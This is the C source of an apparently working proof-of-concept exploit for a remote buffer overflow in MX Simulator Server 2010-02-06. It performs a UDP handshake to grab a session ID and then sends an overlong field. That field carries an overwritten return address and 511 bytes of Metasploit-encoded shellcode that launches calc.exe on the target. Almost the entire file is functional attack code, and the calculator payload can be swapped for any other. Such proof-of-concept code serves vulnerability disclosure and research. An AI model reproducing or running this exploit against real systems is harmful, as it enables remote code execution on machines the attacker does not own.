/*

    MX Simulator Server 2010-02-06 Remote Buffer Overflow PoC
	
	This PoC  will executes  the  calc.exe software on the remote
	system.
	The bug was discovered by Luigi Auriemma (www.aluigi.org)

    Copyright 2010 Salvatore Fresta aka Drosophila
    http://www.salvatorefresta.net/?opt=adv
    http://www.salvatorefresta.net/files/poc/PoC-MXSimulatorServer2010-02-06.zip

    This program is free software; you can redistribute it and/or
    modify it under the terms of  the  GNU General Public License
    as published by the  Free Software Foundation; either version 
    2 of the License, or (at your option) any later version.

    This program  is  distributed  in the hope  that  it  will be
    useful, but WITHOUT ANY WARRANTY;  without  even the  implied
    warranty  of  MERCHANTABILITY  or  FITNESS  FOR  A PARTICULAR
    PURPOSE. See the GNU General Public License for more details.

    You should have  received a copy  of  the  GNU General Public
    License along  with  this program;  if not, write to the Free
    Software Foundation,Inc., 59 Temple Place, Suite 330, Boston,
    MA 02111-1307 USA

    http://www.gnu.org/licenses/gpl-2.0.txt

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>
#endif

#define BUFFSZ      1024
#define PORT        19800

/*
* windows/exec - 511 bytes
* http://www.metasploit.com
* Encoder: x86/alpha_mixed
* EXITFUNC=process, CMD=calc.exe
*/
#define shellcode \
				"\xb8\x9e\xef\xf3\x90\x31\xc9\xb1\x33\xd9\xc2\xd9\x74\x24\xf4" \
				"\x5b\x31\x43\x0e\x83\xc3\x04\x03\xdd\xe5\x11\x65\x1d\x11\x5c" \
				"\x86\xdd\xe2\x3f\x0e\x38\xd3\x6d\x74\x49\x46\xa2\xfe\x1f\x6b" \
				"\x49\x52\x8b\xf8\x3f\x7b\xbc\x49\xf5\x5d\xf3\x4a\x3b\x62\x5f" \
				"\x88\x5d\x1e\x9d\xdd\xbd\x1f\x6e\x10\xbf\x58\x92\xdb\xed\x31" \
				"\xd9\x4e\x02\x35\x9f\x52\x23\x99\x94\xeb\x5b\x9c\x6a\x9f\xd1" \
				"\x9f\xba\x30\x6d\xd7\x22\x3a\x29\xc8\x53\xef\x29\x34\x1a\x84" \
				"\x9a\xce\x9d\x4c\xd3\x2f\xac\xb0\xb8\x11\x01\x3d\xc0\x56\xa5" \
				"\xde\xb7\xac\xd6\x63\xc0\x76\xa5\xbf\x45\x6b\x0d\x4b\xfd\x4f" \
				"\xac\x98\x98\x04\xa2\x55\xee\x43\xa6\x68\x23\xf8\xd2\xe1\xc2" \
				"\x2f\x53\xb1\xe0\xeb\x38\x61\x88\xaa\xe4\xc4\xb5\xad\x40\xb8" \
				"\x13\xa5\x62\xad\x22\xe4\xe8\x30\xa6\x92\x55\x32\xb8\x9c\xf5" \
				"\x5b\x89\x17\x9a\x1c\x16\xf2\xdf\xd3\x5c\x5f\x49\x7c\x39\x35" \
				"\xc8\xe1\xba\xe3\x0e\x1c\x39\x06\xee\xdb\x21\x63\xeb\xa0\xe5" \
				"\x9f\x81\xb9\x83\x9f\x36\xb9\x81\xc3\xd9\x29\x49\x2a\x7c\xca" \
				"\xe8\x32"

int send_recv(int sd, unsigned char *in, int insz, unsigned char *out, int outsz, struct sockaddr_in *peer, int err);
int timeout(int sock, int secs);
unsigned int resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {

    struct  sockaddr_in peer;
    int     sd,
            len;
    unsigned short     port = PORT;
    unsigned char      buff[BUFFSZ],
					   *host = NULL,
					   pkg[] =
								"\x03"
								"\x00\x00\x00\x00"			// slot
								"\x00\x00\x00\x00"			// session id
								"\x00\x00\x00\x00"			// admin pwd crc
								"\x00\x00\x00\x00"			// uid
								"000000000000000000000000"	// ???
								"yz250f||||\n"				// bike's model
								"999\n"						// bike's number
								"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
								"\xd8\x69\x83\x7c"          // EIP - CALL ESP (FFD4)
								shellcode;

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc < 2) {
        printf("\nMX Simulator Server 2010-02-06 Remote Buffer Overflow PoC - Salvatore Fresta\n"
		       "http://www.salvatorefresta.net\n"
		       "\n"
               "Usage: %s <target host> <port> (default: %hu)\n"
                "\n", argv[0], port);
        return -1;
    }

    host = argv[1];
    if(argc > 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr  = resolv(host);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;
	
	printf("\n[*] Socket opening in progress...");

	sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(sd < 0) {
	    printf("\n[-] Unable to open a socket!\n\n");
		std_err();
	}
	
	printf("\n[+] Socket open successfully"
	       "\n[*] Data sending in progress...");

    memset(buff, 0, 9);
	len = send_recv(sd, buff, 9, buff, BUFFSZ, &peer, 1);
		
	*(int *)(pkg + 1) = *(int *)(buff + 1);
	*(int *)(pkg + 5) = *(int *)(buff + 5);	
	len = send_recv(sd, pkg, sizeof(pkg) - 1, buff, BUFFSZ, &peer, 0);

	printf("\n[+] Data sent successfully"
	       "\n[+] Connection closed\n\n");
	
    close(sd);

    return 0;
	
}



int send_recv(int sd, unsigned char *in, int insz, unsigned char *out, int outsz, struct sockaddr_in *peer, int err) {

    int retry,
        len;

    if(in && !out) {
        fputc('.', stdout);
        if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
          < 0) std_err();
        return(0);
    }
	
    if(in) {
        for(retry = 2; retry; retry--) {
            fputc('.', stdout);
            if(sendto(sd, in, insz, 0, (struct sockaddr *)peer, sizeof(struct sockaddr_in))
              < 0) std_err();
            if(!timeout(sd, 1)) break;
        }

        if(!retry) {
            if(!err) return(-1);
            printf("\nError: socket timeout, no reply received\n\n");
            exit(1);
        }
    } else {
        if(timeout(sd, 3) < 0) return(-1);
    }

    fputc('.', stdout);
    len = recvfrom(sd, out, outsz, 0, NULL, NULL);
    if(len < 0 && err) std_err();
    
	return len;
	
}



int timeout(int sock, int secs) {

    struct timeval tout;
    fd_set fd_read;
    int err;

    tout.tv_sec  = secs;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    
	return 0;
	
}



unsigned int resolv(char *host) {

    struct hostent *hp = NULL;
    unsigned int host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(unsigned int *)hp->h_addr;
    }
	
    return host_ip;

}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

